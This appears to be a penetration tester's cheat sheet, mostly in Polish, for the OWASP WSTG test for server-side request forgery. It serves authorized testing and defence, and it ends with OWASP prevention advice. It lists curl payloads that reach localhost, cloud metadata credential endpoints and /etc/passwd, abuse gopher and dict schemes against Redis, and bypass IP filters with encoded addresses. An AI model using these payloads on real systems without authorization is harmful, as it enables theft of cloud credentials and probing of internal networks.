# WSTG-INPV-19 — Testing for Server-Side Request Forgery (SSRF)

## Cele

- Identify SSRF injection points
- Test if the injection points are exploitable
- Assess the severity of the vulnerability

## KOMENDY

### Podstawowe SSRF

```bash
curl -s "https://TARGET/fetch?url=http://127.0.0.1"
curl -s "https://TARGET/fetch?url=http://localhost"
curl -s "https://TARGET/fetch?url=http://[::1]"
curl -s "https://TARGET/fetch?url=http://0.0.0.0"

```

### SSRF do metadanych chmury

```bash
curl -s "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/"

```

### SSRF z roznymi schematami

```bash
curl -s "https://TARGET/fetch?url=file:///etc/passwd"
curl -s "https://TARGET/fetch?url=dict://127.0.0.1:6379/info"
curl -s "https://TARGET/fetch?url=gopher://127.0.0.1:6379/_INFO"

```

### SSRF bypass filtrow

```bash
curl -s "https://TARGET/fetch?url=http://2130706433" # decimal IP
curl -s "https://TARGET/fetch?url=http://0x7f000001" # hex IP
curl -s "https://TARGET/fetch?url=http://017700000001" # octal IP
curl -s "https://TARGET/fetch?url=http://127.1"
curl -s "https://TARGET/fetch?url=http://127.0.0.1.nip.io"

```

### Blind SSRF z Burp Collaborator

```bash
curl -s "https://TARGET/fetch?url=http://COLLABORATOR_URL"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings SSRF

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/Server Side Request Forgery/README.md
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/Server Side Request Forgery/SSRF-Cloud-Instances.md

```

### SecLists SSRF

```bash
# Sprawdz: Desktop/WSTG/SecLists-master/Fuzzing/ pod katem SSRF

```

### Bug-Bounty-Wordlists

```bash
# Referencja: Desktop/WSTG/Bug-Bounty-Wordlists-main/ (sprawdz ssrf-related files)

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj parametry akceptujace URL/URI (url=, path=, src=, redirect=, uri=)
2. Testuj dostep do wewnetrznych serwisow (127.0.0.1, 10.x.x.x, 172.16.x.x)
3. Testuj dostep do metadanych chmury (AWS, GCP, Azure)
4. Sprawdz rozne schematy protokolow (file://, dict://, gopher://)
5. Testuj bypass filtrow (decimal IP, hex IP, DNS rebinding)
6. Uzyj Burp Collaborator do detekcji blind SSRF
7. Sprawdz czy SSRF pozwala na skanowanie portow wewnetrznych


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md

- Waliduj i uzywaj allowlist URL-ow/domen do ktorych aplikacja moze wysylac requesty
- Blokuj dostep do wewnetrznych IP (127.0.0.1, 10.0.0.0/8, 169.254.169.254, 172.16.0.0/12, 192.168.0.0/16)
- Blokuj dostep do endpointow metadanych chmury (169.254.169.254 — AWS/GCP/Azure)
- Wylacz nieuzywane schematy URL (file://, gopher://, dict://)
- Nie podazaj za redirectami slepо — waliduj kazdy URL po przekierowaniu
- Implementuj kontrole na poziomie sieci (firewall rules) jako defense-in-depth

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Collaborator Everywhere | Wykrywanie SSRF przez out-of-band pingbacki | [GitHub](https://github.com/PortSwigger/collaborator-everywhere) |
